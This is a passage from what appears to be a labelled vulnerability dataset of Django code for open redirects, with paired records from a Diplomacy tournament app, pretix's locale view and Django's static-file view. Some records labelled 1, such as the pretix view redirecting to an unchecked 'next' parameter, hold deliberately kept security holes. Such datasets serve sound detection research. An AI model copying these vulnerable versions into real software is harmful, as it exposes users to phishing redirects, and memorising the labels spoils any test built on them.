1)))\n        self.assertEqual(response.status_code, 200)\n\n    def test_roll_call_not_logged_in(self):\n        response = self.client.get(reverse('round_roll_call', args=(self.t.pk, 1)))\n        self.assertEqual(response.status_code, 302)\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "1ac934531ba0a3f16aee86e3b36a912dc8b67821", "code": "/visualiser/tournament/round_views.py/n/n# Diplomacy Tournament Visualiser\n# Copyright (C) 2014, 2016-2019 Chris Brand\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"\nRound Views for the Diplomacy Tournament Visualiser.\n\"\"\"\n\nfrom django.contrib.auth.decorators import permission_required\nfrom django.core.exceptions import ValidationError\nfrom django.forms.formsets import formset_factory\nfrom django.http import Http404, HttpResponseRedirect\nfrom django.shortcuts import render\nfrom django.urls import reverse\nfrom django.utils.translation import ugettext as _\n\nfrom tournament.forms import BaseGamePlayersFormset\nfrom tournament.forms import BasePlayerRoundFormset\nfrom tournament.forms import BasePowerAssignFormset\nfrom tournament.forms import GamePlayersForm\nfrom tournament.forms import GameScoreForm\nfrom tournament.forms import GetSevenPlayersForm\nfrom tournament.forms import PlayerRoundForm\nfrom tournament.forms import PowerAssignForm\n\nfrom tournament.tournament_views import get_modifiable_tournament_or_404\nfrom tournament.tournament_views import get_visible_tournament_or_404\n\nfrom tournament.diplomacy import GreatPower, GameSet\nfrom tournament.email import send_board_call\nfrom tournament.game_seeder import GameSeeder\nfrom tournament.models import Tournament, Round, Game\nfrom tournament.models import TournamentPlayer, RoundPlayer, GamePlayer\n\n# Round views\n\ndef get_round_or_404(tournament, round_num):\n    \"\"\"Return the specified numbered round of the specified tournament or raise Http404.\"\"\"\n    try:\n        return tournament.round_numbered(round_num)\n    except Round.DoesNotExist:\n        raise Http404\n\ndef round_simple(request, tournament_id, round_num, template):\n    \"\"\"Just render the specified template with the round\"\"\"\n    t = get_visible_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    context = {'tournament': t, 'round': r}\n    return render(request, 'rounds/%s.html' % template, context)\n\n@permission_required('tournament.add_roundplayer')\ndef roll_call(request, tournament_id, round_num=None):\n    \"\"\"Provide a form to specify which players are playing each round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    PlayerRoundFormset = formset_factory(PlayerRoundForm,\n                                         extra=2,\n                                         formset=BasePlayerRoundFormset)\n    if round_num:\n        r = get_round_or_404(t, round_num)\n        round_set = t.round_set.filter(pk=r.pk)\n    else:\n        round_set = t.round_set.all()\n    data = []\n    # Go through each player in the Tournament\n    for tp in t.tournamentplayer_set.all():\n        current = {'player': tp.player}\n        rps = tp.roundplayers()\n        # And each round of the Tournament\n        for r in round_set:\n            # Is this player listed as playing this round ?\n            played = rps.filter(the_round=r).exists()\n            current['round_%d' % r.number()] = played\n        data.append(current)\n    if round_num:\n        formset = PlayerRoundFormset(request.POST or None,\n                                     tournament=t,\n                                     round_num=int(round_num),\n                                     initial=data)\n    else:\n        formset = PlayerRoundFormset(request.POST or None,\n                                     tournament=t,\n                                     initial=data)\n    if formset.is_valid():\n        for form in formset:\n            try:\n                p = form.cleaned_data['player']\n            except KeyError:\n                # This must be one of the extra forms, still empty\n                continue\n            # Ensure that this Player is in the Tournament\n            i, created = TournamentPlayer.objects.get_or_create(player=p,\n                                                                tournament=t)\n            try:\n                i.full_clean()\n            except ValidationError as e:\n                form.add_error(form.fields['player'], e)\n                i.delete()\n                return render(request,\n                              'tournaments/round_players.html',\n                              {'title': _('Roll Call'),\n                               'tournament': t,\n                               'post_url': reverse('roll_call', args=(tournament_id,)),\n                               'formset' : formset})\n            if created:\n                i.save()\n            for r_name, value in form.cleaned_data.items():\n                if r_name == 'player':\n                    # This column is just for the user\n                    continue\n                # Extract the round number from the field name\n                i = int(r_name[6:])\n                # Find that Round\n                r = t.round_numbered(i)\n                # Ignore non-bool fields and ones that aren't True\n                if value is True:\n                    # Ensure that we have a corresponding RoundPlayer\n                    i, created = RoundPlayer.objects.get_or_create(player=p,\n                                                                   the_round=r)\n                    try:\n                        i.full_clean()\n                    except ValidationError as e:\n                        form.add_error(None, e)\n                        i.delete()\n                        return render(request,\n                                      'tournaments/round_players.html',\n                                      {'title': _('Roll Call'),\n                                       'tournament': t,\n                                       'post_url': reverse('roll_call', args=(tournament_id,)),\n                                       'formset' : formset})\n                    if created:\n                        i.save()\n                else:\n                    # delete any corresponding RoundPlayer\n                    # This could be a player who was previously checked-off in error\n                    RoundPlayer.objects.filter(player=p,\n                                               the_round=r).delete()\n        r = t.current_round()\n        # If we're doing a roll call for a single round,\n        # we only want to seed boards if it's the current round\n        if not round_num or (r.number() == round_num):\n            if t.seed_games:\n                if (r.roundplayer_set.count() % 7) == 0:\n                    # We have an exact multiple of 7 players, so go straight to seeding\n                    return HttpResponseRedirect(reverse('seed_games',\n                                                        args=(tournament_id,\n                                                              r.number())))\n                # We need players to sit out or play multiple games\n                return HttpResponseRedirect(reverse('get_seven',\n                                                    args=(tournament_id,\n                                                          r.number())))\n            else:\n                # Next job is almost certainly to create the actual games\n                return HttpResponseRedirect(reverse('create_games',\n                                                    args=(tournament_id,\n                                                          r.number())))\n\n    return render(request,\n                  'tournaments/round_players.html',\n                  {'title': _('Roll Call'),\n                   'tournament': t,\n                   'post_url': reverse('roll_call', args=(tournament_id,)),\n                   'formset' : formset})\n\n@permission_required('tournament.add_game')\ndef get_seven(request, tournament_id, round_num):\n    \"\"\"Provide a form to get a multiple of seven players for a round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    count = r.roundplayer_set.count()\n    sitters = count % 7\n    # If we already have an exact multiple of seven players, go straight to creating games\n    if sitters == 0:\n        return HttpResponseRedirect(reverse('seed_games',\n                                            args=(tournament_id,\n                                                  round_num)))\n\n    doubles = 7 - sitters\n    context = {'tournament': t,\n               'round': r,\n               'count' : count,\n               'sitters' : sitters,\n               'doubles' : doubles}\n    form = GetSevenPlayersForm(request.POST or None,\n                               the_round=r)\n    if form.is_valid():\n        # Update RoundPlayers to indicate number of games they're playing\n        # First clear any old game_counts\n        for rp in r.roundplayer_set.exclude(game_count=1):\n            rp.game_count = 1\n            rp.save()\n        for i in range(sitters):\n            rp = form.cleaned_data['sitter_%d' % i]\n            if rp:\n                rp.game_count = 0\n                rp.save()\n        for i in range(doubles):\n            rp = form.cleaned_data['double_%d' % i]\n            if rp:\n                rp.game_count = 2\n                rp.save()\n        return HttpResponseRedirect(reverse('seed_games',\n                                            args=(tournament_id,\n                                                  round_num)))\n    context['form'] = form\n    return render(request,\n                  'rounds/get_seven.html',\n                  context)\n\ndef _sitters_and_two_gamers(tournament, the_round):\n    \"\"\" Return a (sitters, two_gamers) 2-tuple\"\"\"\n    tourney_players = tournament.tournamentplayer_set.all()\n    round_players = the_round.roundplayer_set.all()\n    # Get the set of players that haven't already been assigned to games for this round\n    rps = []\n    sitters = set()\n    two_gamers = set()\n    for rp in round_players:\n        assert rp.gameplayers().count() == 0, \"%d games already exist for %s in this round\" % (rp.gameplayers().count(),\n                                                                                               str(rp))\n        rps.append(rp)\n        if rp.game_count == 1:\n            continue\n        elif rp.game_count == 0:\n            # This player is sitting out this round\n            sitters.add(rp.tournamentplayer())\n        elif rp.game_count == 2:\n            # This player is playing two games this round\n            two_gamers.add(rp.tournamentplayer())\n        else:\n            assert 0, 'Unexpected game_count value %d for %s' % (rp.game_count, str(rp))\n    assert (not sitters) or (not two_gamers)\n    if sitters:\n        # Check that we have the right number of players sitting out\n        assert (len(rps) - len(sitters)) % 7 == 0\n    if two_gamers:\n        # Check that we have the right number of players playing two games\n        assert (len(rps) + len(two_gamers)) % 7 == 0\n    # We also need to flag any players who aren't present for this round as sitting out\n    for tp in tourney_players:\n        if not round_players.filter(player=tp.player).exists():\n            sitters.add(tp)\n    return sitters, two_gamers\n\ndef _create_game_seeder(tournament, round_number):\n    \"\"\"Return a GameSeeder that knows about the tournament so far\"\"\"\n    tourney_players = tournament.tournamentplayer_set.all()\n    # Create the game seeder\n    seeder = GameSeeder(GreatPower.objects.all(),\n                        starts=100,\n                        iterations=10)\n    # Tell the seeder about every player in the tournament\n    # (regardless of whether they're playing this round - they may have played already)\n    for tp in tourney_players:\n        seeder.add_player(tp)\n    # Provide details of games already played this tournament\n    for n in range(1, round_number):\n        rnd = tournament.round_numbered(n)\n        for g in rnd.game_set.all():\n            game = set()\n            for gp in g.gameplayer_set.all():\n                game.add((gp.tournamentplayer(), gp.power))\n            # TODO This doesn't deal with replacement players\n            assert len(game) == 7\n            seeder.add_played_game(game)\n    # Add in any biases now that all players have been added\n    for tp in tourney_players:\n        # Just use seederbias_set so we only get each SeederBias once\n        # because we only look at their player1\n        for sb in tp.seederbias_set.all():\n            seeder.add_bias(sb.player1, sb.player2, sb.weight)\n    return seeder\n\ndef _seed_games(tournament, the_round):\n    \"\"\"Wrapper round GameSeeder to do the actual seeding for a round\"\"\"\n    seeder = _create_game_seeder(tournament, the_round.number())\n    sitters, two_gamers = _sitters_and_two_gamers(tournament, the_round)\n    # Generate the games\n    return seeder.seed_games(omitting_players=sitters,\n                             players_doubling_up=two_gamers)\n\ndef _seed_games_and_powers(tournament, the_round):\n    \"\"\"Wrapper round GameSeeder to do the actual seeding for a round\"\"\"\n    seeder = _create_game_seeder(tournament, the_round.number())\n    sitters, two_gamers = _sitters_and_two_gamers(tournament, the_round)\n    # Generate the games\n    return seeder.seed_games_and_powers(omitting_players=sitters,\n                                        players_doubling_up=two_gamers)\n\n@permission_required('tournament.add_game')\ndef seed_games(request, tournament_id, round_num):\n    \"\"\"Seed players to the games for a round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    if request.method == 'POST':\n        PowerAssignFormset = formset_factory(PowerAssignForm,\n                                             formset=BasePowerAssignFormset,\n                                             extra=0)\n        formset = PowerAssignFormset(request.POST, the_round=r)\n        if formset.is_valid():\n            for f in formset:\n                # Update the game\n                g = f.game\n                g.name = f.cleaned_data['game_name']\n                g.the_set = f.cleaned_data['the_set']\n                try:\n                    g.full_clean()\n                except ValidationError as e:\n                    f.add_error(None, e)\n                    return render(request,\n                                  'rounds/seeded_games.html',\n                                  {'tournament': t,\n                                   'round': r,\n                                   'formset' : formset})\n                g.save()\n                # Assign the powers to the players\n                for gp_id, field in f.cleaned_data.items():\n                    if gp_id in ['the_set', 'game_name']:\n                        continue\n                    gp = GamePlayer.objects.get(id=gp_id)\n                    gp.power = field\n                    try:\n                        gp.full_clean()\n                    except ValidationError as e:\n                        f.add_error(None, e)\n                        return render(request,\n                                      'rounds/seeded_games.html',\n                                      {'tournament': t,\n                                       'round': r,\n                                       'formset' : formset})\n                    gp.save()\n            # Notify the players\n            send_board_call(r)\n            # Redirect to the index of games in the round\n            return HttpResponseRedirect(reverse('game_index',\n                                                args=(tournament_id, round_num)))\n    else:\n        # Delete any existing Games and GamePlayers for this round\n        r.game_set.all().delete()\n        # TODO It's a bit hokey to have a fixed default GameSet here\n        default_set = GameSet.objects.get(pk=1)\n        data = []\n        # Generate a seeding, and assign powers if required\n        if t.power_assignment == Tournament.AUTO:\n            games = _seed_games_and_powers(t, r)\n            # Add the Games and GamePlayers to the database\n            for i, g in enumerate(games, start=1):\n                new_game = Game.objects.create(name='R%sG%d' % (round_num, i),\n                                               the_round=r,\n                                               the_set=default_set)\n                current = {'game_name': new_game.name,\n                           'the_set': new_game.the_set}\n                for tp, power in g:\n                    gp = GamePlayer.objects.create(player=tp.player,\n                                                   game=new_game,\n                                                   power=power)\n                    current[gp.id] = power\n                data.append(current)\n        else:\n            games = _seed_games(t, r)\n            # Add the Games and GamePlayers to the database\n            for i, g in enumerate(games, start=1):\n                new_game = Game.objects.create(name='R%sG%d' % (round_num, i),\n                                               the_round=r,\n                                               the_set=default_set)\n                current = {'game_name': new_game.name,\n                           'the_set': new_game.the_set}\n                for tp in g:\n                    gp = GamePlayer.objects.create(player=tp.player,\n                                                   game=new_game)\n                # If we're assigning powers from preferences, do so now\n                if t.power_assignment == Tournament.PREFERENCES:\n                    new_game.assign_powers_from_prefs()\n                for tp in g:\n                    gp = GamePlayer.objects.get(player=tp.player,\n                                                game=new_game)\n                    current[gp.id] = gp.power\n                data.append(current)\n        # Create a form for each of the resulting games\n        PowerAssignFormset = formset_factory(PowerAssignForm,\n                                             formset=BasePowerAssignFormset,\n                                             extra=0)\n        formset = PowerAssignFormset(the_round=r, initial=data)\n    # Note that we wait for confirmation before adding them to the database\n    context = {'tournament': t, 'round': r, 'games': games, 'formset': formset}\n    return render(request, 'rounds/seeded_games.html', context)\n\n@permission_required('tournament.add_game')\ndef create_games(request, tournament_id, round_num):\n    \"\"\"Provide a form to create the games for a round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    # Do any games already exist for the round ?\n    games = r.game_set.all()\n    data = []\n    for g in games:\n        current = {'game_name': g.name,\n                   'the_set': g.the_set}\n        for gp in g.gameplayer_set.all():\n            current[gp.power.name] = gp.roundplayer()\n        data.append(current)\n    # Estimate the number of games for the round\n    round_players = r.roundplayer_set.count()\n    expected_games = (round_players + 6) // 7\n    # This can happen if there are no RoundPlayers for this round\n    if expected_games < 1:\n        expected_games = 1\n    GamePlayersFormset = formset_factory(GamePlayersForm,\n                                         extra=expected_games - games.count(),\n                                         formset=BaseGamePlayersFormset)\n    formset = GamePlayersFormset(request.POST or None,\n                                 the_round=r,\n                                 initial=data)\n    if formset.is_valid():\n        for f in formset:\n            # Update/create the game\n            try:\n                g, created = Game.objects.get_or_create(name=f.cleaned_data['game_name'],\n                                                        the_round=r,\n                                                        the_set=f.cleaned_data['the_set'])\n            except KeyError:\n                # This must be an extra, unused formset\n                continue\n            try:\n                g.full_clean()\n            except ValidationError as e:\n                f.add_error(None, e)\n                g.delete()\n                return render(request,\n                              'rounds/create_games.html',\n                              {'tournament': t,\n                               'round': r,\n                               'formset' : formset})\n            if created:\n                g.save()\n            # Assign the players to the game\n            for power, field in f.cleaned_data.items():\n                try:\n                    p = GreatPower.objects.get(name=power)\n                except GreatPower.DoesNotExist:\n                    continue\n                # Is there already a player for this power in this game ?\n                try:\n                    i = GamePlayer.objects.get(game=g,\n                                               power=p)\n                except GamePlayer.DoesNotExist:\n                    # Create one (default first_season and first_year)\n                    i = GamePlayer(player=field.player, game=g, power=p)\n                else:\n                    # Change the player (if necessary)\n                    i.player = field.player\n                try:\n                    i.full_clean()\n                except ValidationError as e:\n                    f.add_error(None, e)\n                    # TODO Not 100% certain that this is the right thing to do here\n                    i.delete()\n                    return render(request,\n                                  'rounds/create_games.html',\n                                  {'tournament': t,\n                                   'round': r,\n                                   'formset' : formset})\n                i.save()\n        # Notify the players\n        send_board_call(r)\n        # Redirect to the index of games in the round\n        return HttpResponseRedirect(reverse('game_index',\n                                            args=(tournament_id, round_num)))\n\n    return render(request,\n                  'rounds/create_games.html',\n                  {'tournament': t,\n                   'round': r,\n                   'formset' : formset})\n\n@permission_required('tournament.change_gameplayer')\ndef game_scores(request, tournament_id, round_num):\n    \"\"\"Provide a form to enter scores for all the games in a round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    GameScoreFormset = formset_factory(GameScoreForm,\n                                       extra=0)\n    # Initial data\n    data = []\n    the_list = r.game_set.all()\n    for game in the_list:\n        content = {'game_name': game.name}\n        for gp in game.gameplayer_set.all():\n            content[gp.power.name] = gp.score\n        data.append(content)\n    formset = GameScoreFormset(request.POST or None, initial=data)\n    if formset.is_valid():\n        for f in formset:\n            # Find the game\n            g = Game.objects.get(name=f.cleaned_data['game_name'],\n                                 the_round=r)\n            # Set the score for each player\n            for power, field in f.cleaned_data.items():\n                # Ignore non-GreatPower fields (game_name)\n                try:\n                    p = GreatPower.objects.get(name=power)\n                except GreatPower.DoesNotExist:\n                    continue\n                # Find the matching GamePlayer\n                # TODO This will fail if there was a replacement\n                i = GamePlayer.objects.get(game=g,\n                                           power=p)\n                # Set the score\n                i.score = field\n                try:\n                    i.full_clean()\n                except ValidationError as e:\n                    f.add_error(None, e)\n                    return render(request,\n                                  'rounds/game_score.html',\n                                  {'tournament': t,\n                                   'round': round_num,\n                                   'formset' : formset})\n                i.save()\n        # Redirect to the round index\n        return HttpResponseRedirect(reverse('round_index',\n                                            args=(tournament_id)))\n\n    return render(request,\n                  'rounds/game_score.html',\n                  {'tournament': t,\n                   'round': round_num,\n                   'formset' : formset})\n\ndef game_index(request, tournament_id, round_num):\n    \"\"\"Display a list of games in the round\"\"\"\n    t = get_visible_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    the_list = r.game_set.all()\n    context = {'round': r, 'game_list': the_list}\n    return render(request, 'games/index.html', context)\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "00e9e52072a403be45c9e74776cef128766dba20", "code": "src/pretix/presale/views/locale.py/n/nfrom datetime import datetime, timedelta\n\nfrom django.conf import settings\nfrom django.shortcuts import redirect\nfrom django.utils.http import is_safe_url\nfrom django.views.generic import View\n\n\nclass LocaleSet(View):\n\n    def get(self, request, *args, **kwargs):\n        url = request.GET.get('next', request.META.get('HTTP_REFERER', '/'))\n        url = url if is_safe_url(url, host=request.get_host()) else '/'\n        resp = redirect(url)\n\n        locale = request.GET.get('locale')\n        if locale in [lc for lc, ll in settings.LANGUAGES]:\n            if request.user.is_authenticated():\n                request.user.locale = locale\n                request.user.save()\n\n            max_age = 10 * 365 * 24 * 60 * 60\n            resp.set_cookie(settings.LANGUAGE_COOKIE_NAME, locale, max_age=max_age,\n                            expires=(datetime.utcnow() + timedelta(seconds=max_age)).strftime(\n                                '%a, %d-%b-%Y %H:%M:%S GMT'),\n                            domain=settings.SESSION_COOKIE_DOMAIN)\n\n        return resp\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "00e9e52072a403be45c9e74776cef128766dba20", "code": "/src/pretix/presale/views/locale.py/n/nfrom datetime import datetime, timedelta\n\nfrom django.conf import settings\nfrom django.shortcuts import redirect\nfrom django.views.generic import View\n\n\nclass LocaleSet(View):\n\n    def get(self, request, *args, **kwargs):\n        locale = request.GET.get('locale')\n        resp = redirect(request.GET.get('next', request.META.get('HTTP_REFERER', '/')))\n        if locale in [lc for lc, ll in settings.LANGUAGES]:\n            if request.user.is_authenticated():\n                request.user.locale = locale\n                request.user.save()\n\n            max_age = 10 * 365 * 24 * 60 * 60\n            resp.set_cookie(settings.LANGUAGE_COOKIE_NAME, locale, max_age=max_age,\n                            expires=(datetime.utcnow() + timedelta(seconds=max_age)).strftime(\n                                '%a, %d-%b-%Y %H:%M:%S GMT'),\n                            domain=settings.SESSION_COOKIE_DOMAIN)\n        return resp\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "a1f948b468b6621083a03b0d53432341b7a4d753", "code": "django/views/static.py/n/n\"\"\"\nViews and functions for serving static files. These are only to be used\nduring development, and SHOULD NOT be used in a production setting.\n\"\"\"\nimport mimetypes\nimport os\nimport posixpath\nimport re\nimport stat\n\nfrom django.http import (\n    FileResponse, Http404, HttpResponse, HttpResponseNotModified,\n)\nfrom django.template import Context, Engine, TemplateDoesNotExist, loader\nfrom django.utils._os import safe_join\nfrom django.utils.http import http_date, parse_http_date\nfrom django.utils.translation import gettext as _, gettext_lazy\n\n\ndef serve(request, path, document_root=None, show_indexes=False):\n    \"\"\"\n    Serve static files below a given point in the directory structure.\n\n    To use, put a URL pattern such as::\n\n        from django.views.static import serve\n\n        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})\n\n    in your URLconf. You must provide the ``document_root`` param. You may\n    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index\n    of the directory.  This index view will use the template hardcoded below,\n    but if you'd like to override it, you can create a template called\n    ``static/directory_index.html``.\n    \"\"\"\n    path = posixpath.normpath(path).lstrip('/')\n    fullpath = safe_join(document_root, path)\n    if os.path.isdir(fullpath):\n        if show_indexes:\n            return directory_index(path, fullpath)\n        raise Http404(_(\"Directory indexes are not allowed here.\"))\n    if not os.path.exists(fullpath):\n        raise Http404(_('\"%(path)s\" does not exist') % {'path': fullpath})\n    # Respect the If-Modified-Since header.\n    statobj = os.stat(fullpath)\n    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),\n                              statobj.st_mtime, statobj.st_size):\n        return HttpResponseNotModified()\n    content_type, encoding = mimetypes.guess_type(fullpath)\n    content_type = content_type or 'application/octet-stream'\n    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)\n    response[\"Last-Modified\"] = http_date(statobj.st_mtime)\n    if stat.S_ISREG(statobj.st_mode):\n        response[\"Content-Length\"] = statobj.st_size\n    if encoding:\n        response[\"Content-Encoding\"] = encoding\n    return response\n\n\nDEFAULT_DIRECTORY_INDEX_TEMPLATE = \"\"\"\n{% load i18n %}\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta http-equiv=\"Content-Language\" content=\"en-us\" />\n    <meta name=\"robots\" content=\"NONE,NOARCHIVE\" />\n    <title>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</title>\n  </head>\n  <body>\n    <h1>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</h1>\n    <ul>\n      {% if directory != \"/\" %}\n      <li><a href=\"../\">../</a></li>\n      {% endif %}\n      {% for f in file_list %}\n      <li><a href=\"{{ f|urlencode }}\">{{ f }}</a></li>\n      {% endfor %}\n    </ul>\n  </body>\n</html>\n\"\"\"\ntemplate_translatable = gettext_lazy(\"Index of %(directory)s\")\n\n\ndef directory_index(path, fullpath):\n    try:\n        t = loader.select_template([\n            'static/directory_index.html',\n            'static/directory_index',\n        ])\n    except TemplateDoesNotExist:\n        t = Engine(libraries={'i18n': 'django.templatetags.i18n'}).from_string(DEFAULT_DIRECTORY_INDEX_TEMPLATE)\n    files = []\n    for f in os.listdir(fullpath):\n        if not f.startswith('.'):\n            if os.path.isdir(os.path.join(fullpath, f)):\n                f += '/'\n            files.append(f)\n    c = Context({\n        'directory': path + '/',\n        'file_list': files,\n    })\n    return HttpResponse(t.render(c))\n\n\ndef was_modified_since(header=None, mtime=0, size=0):\n    \"\"\"\n    Was something modified since the user last downloaded it?\n\n    header\n      This is the value of the If-Modified-Since header.  If this is None,\n      I'll just return True.\n\n    mtime\n      This is the modification time of the item we're talking about.\n\n    size\n      This is the size of the item we're talking about.\n    \"\"\"\n    try:\n        if header is None:\n            raise ValueError\n        matches = re.match(r\"^([^;]+)(; length=([0-9]+))?$\", header,\n                           re.IGNORECASE)\n        header_mtime = parse_http_date(matches.group(1))\n        header_len = matches.group(3)\n        if header_len and int(header_len) != size:\n            raise ValueError\n        if int(mtime) > header_mtime:\n            raise ValueError\n    except (AttributeError, ValueError, OverflowError):\n        return True\n    return False\n/n/n/ntests/view_tests/tests/test_static.py/n/nimport mimetypes\nimport unittest\nfrom os import path\nfrom urllib.parse import quote\n\nfrom django.conf.urls.static import static\nfrom django.core.exceptions import ImproperlyConfigured\nfrom django.http import FileResponse, HttpResponseNotModified\nfrom django.test import SimpleTestCase, override_settings\nfrom django.utils.http import http_date\nfrom django.views.static import was_modified_since\n\nfrom .. import urls\nfrom ..urls import media_dir\n\n\n@override_settings(DEBUG=True, ROOT_URLCONF='view_tests.urls')\nclass StaticTests(SimpleTestCase):\n    \"\"\"Tests django views in django/views/static.py\"\"\"\n\n    prefix = 'site_media'\n\n    def test_serve(self):\n        \"The static view can serve static media\"\n        media_files = ['file.txt', 'file.txt.gz', '%2F.txt']\n        for filename in media_files:\n            response = self.client.get('/%s/%s' % (self.prefix, quote(filename)))\n            response_content = b''.join(response)\n            file_path = path.join(media_dir, filename)\n            with open(file_path, 'rb') as fp:\n                self.assertEqual(fp.read(), response_content)\n            self.assertEqual(len(response_content), int(response['Content-Length']))\n            self.assertEqual(mimetypes.guess_type(file_path)[1], response.get('Content-Encoding', None))\n\n    def test_chunked(self):\n        \"The static view should stream files in chunks to avoid large memory usage\"\n        response = self.client.get('/%s/%s' % (self.prefix, 'long-line.txt'))\n        first_chunk = next(response.streaming_content)\n        self.assertEqual(len(first_chunk), FileResponse.block_size)\n        second_chunk = next(response.streaming_content)\n        response.close()\n        # strip() to prevent OS line endings from causing differences\n        self.assertEqual(len(second_chunk.strip()), 1449)\n\n    def test_unknown_mime_type(self):\n        response = self.client.get('/%s/file.unknown' % self.prefix)\n        self.assertEqual('application/octet-stream', response['Content-Type'])\n        response.close()\n\n    def test_copes_with_empty_path_component(self):\n        file_name = 'file.txt'\n        response = self.client.get('/%s//%s' % (self.prefix, file_name))\n        response_content = b''.join(response)\n        with open(path.join(media_dir, file_name), 'rb') as fp:\n            self.assertEqual(fp.read(), response_content)\n\n    def test_is_modified_since(self):\n        file_name = 'file.txt'\n        response = self.client.get(\n            '/%s/%s' % (self.prefix, file_name),\n            HTTP_IF_MODIFIED_SINCE='Thu, 1 Jan 1970 00:00:00 GMT'\n        )\n        response_content = b''.join(response)\n        with open(path.join(media_dir, file_name), 'rb') as fp:\n            self.assertEqual(fp.read(), response_content)\n\n    def test_not_modified_since(self):\n        file_name = 'file.txt'\n        response = self.client.get(\n            '/%s/%s' % (self.prefix, file_name),\n            HTTP_IF_MODIFIED_SINCE='Mon, 18 Jan 2038 05:14:07 GMT'\n            # This is 24h before max Unix time. Remember to fix Django and\n            # update this test well before 2038 :)\n        )\n        self.assertIsInstance(response, HttpResponseNotModified)\n\n    def test_invalid_if_modified_since(self):\n        \"\"\"Handle bogus If-Modified-Since values gracefully\n\n        Assume that a file is modified since an invalid timestamp as per RFC\n        2616, section 14.25.\n        \"\"\"\n        file_name = 'file.txt'\n        invalid_date = 'Mon, 28 May 999999999999 28:25:26 GMT'\n        response = self.client.get('/%s/%s' % (self.prefix, file_name),\n                                   HTTP_IF_MODIFIED_SINCE=invalid_date)\n        response_content = b''.join(response)\n        with open(path.join(media_dir, file_name), 'rb') as fp:\n            self.assertEqual(fp.read(), response_content)\n        self.assertEqual(len(response_content), int(response['Content-Length']))\n\n    def test_invalid_if_modified_since2(self):\n        \"\"\"Handle even more bogus If-Modified-Since values gracefully\n\n        Assume that a file is modified since an invalid timestamp as per RFC\n        2616, section 14.25.\n        \"\"\"\n        file_name = 'file.txt'\n        invalid_date = ': 1291108438, Wed, 20 Oct 2010 14:05:00 GMT'\n        response = self.client.get('/%s/%s' % (self.prefix, file_name),\n                                   HTTP_IF_MODIFIED_SINCE=invalid_date)\n        response_content = b''.join(response)\n        with open(path.join(media_dir, file_name), 'rb') as fp:\n            self.assertEqual(fp.read(), response_content)\n        self.assertEqual(len(response_content), int(response['Content-Length']))\n\n    def test_404(self):\n        response = self.client.get('/%s/nonexistent_resource' % self.prefix)\n        self.assertEqual(404, response.status_code)\n\n    def test_index(self):\n        response = self.client.get('/%s/' % self.prefix)\n        self.assertContains(response, 'Index of ./')\n\n\nclass StaticHelperTest(StaticTests):\n    \"\"\"\n    Test case to make sure the static URL pattern helper works as expected\n    \"\"\"\n    def setUp(self):\n        super().setUp()\n        self._old_views_urlpatterns = urls.urlpatterns[:]\n        urls.urlpatterns += static('/media/', document_root=media_dir)\n\n    def tearDown(self):\n        super().tearDown()\n        urls.urlpatterns = self._old_views_urlpatterns\n\n    def test_prefix(self):\n        self.assertEqual(static('test')[0].regex.pattern, '^test(?P<path>.*)$')\n\n    @override_settings(DEBUG=False)\n    def test_debug_off(self):\n        \"\"\"No URLs are served if DEBUG=False.\"\"\"\n        self.assertEqual(static('test'), [])\n\n    def test_empty_prefix(self):\n        with self.assertRaisesMessage(ImproperlyConfigured, 'Empty static prefix not permitted'):\n            static('')\n\n    def test_special_prefix(self):\n        \"\"\"No URLs are served if prefix contains '://'.\"\"\"\n        self.assertEqual(static('http://'), [])\n\n\nclass StaticUtilsTests(unittest.TestCase):\n    def test_was_modified_since_fp(self):\n        \"\"\"\n        A floating point mtime does not disturb was_modified_since (#18675).\n        \"\"\"\n        mtime = 1343416141.107817\n        header = http_date(mtime)\n        self.assertFalse(was_modified_since(header, mtime))\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "a1f948b468b6621083a03b0d53432341b7a4d753", "code": "/django/views/static.py/n/n\"\"\"\nViews and functions for serving static files. These are only to be used\nduring development, and SHOULD NOT be used in a production setting.\n\"\"\"\nimport mimetypes\nimport os\nimport posixpath\nimport re\nimport stat\n\nfrom django.http import (\n    FileResponse, Http404, HttpResponse, HttpResponseNotModified,\n    HttpResponseRedirect,\n)\nfrom django.template import Context, Engine, TemplateDoesNotExist, loader\nfrom django.utils.http import http_date, parse_http_date\nfrom django.utils.translation import gettext as _, gettext_lazy\n\n\ndef serve(request, path, document_root=None, show_indexes=False):\n    \"\"\"\n    Serve static files below a given point in the directory structure.\n\n    To use, put a URL pattern such as::\n\n        from django.views.static import serve\n\n        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})\n\n    in your URLconf. You must provide the ``document_root`` param. You may\n    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index\n    of the directory.  This index view will use the template hardcoded below,\n    but if you'd like to override it, you can create a template called\n    ``static/directory_index.html``.\n    